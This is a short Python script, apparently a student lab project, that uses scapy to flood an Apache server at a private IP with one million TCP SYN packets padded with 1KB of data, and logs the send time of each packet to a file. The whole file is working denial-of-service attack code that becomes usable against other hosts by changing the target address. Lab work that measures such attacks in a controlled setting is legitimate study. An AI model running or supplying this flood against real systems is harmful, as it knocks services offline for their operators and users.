# Project made by: Dana Zorohov 207817529, Nir Meir 313229106


"""
----DDOS Project----
This script is sending a huge amount of syn packets to a given target (Apache server).
The time of sending packet is recorded and written on "syns_results_p.txt"
"""

# IMPORTS
from scapy.layers.inet import IP, TCP
from scapy.all import *
import time

# The time records file
f = open("syns_results_p.txt", "a")

# Start time of the attack
start_attack = time.time()

# Counter for each syn packet
counter = 0

# 100 iterations loop, each loop sending 10K syn packets, total - 1M packets
for i in range(0, 100):

    # Writing to "syns_results_p.txt" the number of the iteration
    f.write("Loop number" + " " + str(i))
    f.write("\n")

    # Sending syn packet 10K times
    for j in range(0, 10000):
        # syn packet's counter
        counter += 1

        # start time of sending this specific packet
        start = time.time()

        # Our Apache server's IP
        target_ip = "192.168.248.138"

        # The target's port
        target_port = 80

        # Forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)

        # Forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

        # Add some flooding data (1KB in this case)
        raw = Raw(b"X" * 1024)

        # Stack up the layers
        p = ip / tcp / raw

        # Send the constructed packet in a loop until CTRL+C is detected
        send(p, loop=0, verbose=0)

        # end time of sending this specific packet
        end = time.time()

        # total sending time of the packet
        total = end - start
        print('Execution time:', total, 'seconds')

        f.write("Index of syn request" + " " + str(j))
        f.write("\n")
        f.write("Time to take" + " " + str(total) + "  " + "Sec")
        f.write("\n")
        f.write("\n")

print("DDos attack is done")
# End time of the attack
end_attack = time.time()
# Total time of the attack
total_attack = end_attack - start_attack
# Average time of the attack
average = total_attack / counter

f.write("Total attack time took" + " " + str(total_attack))
f.write("\n")
f.write("The average time per packet is" + " " + str(average))
print(counter)
f.close()
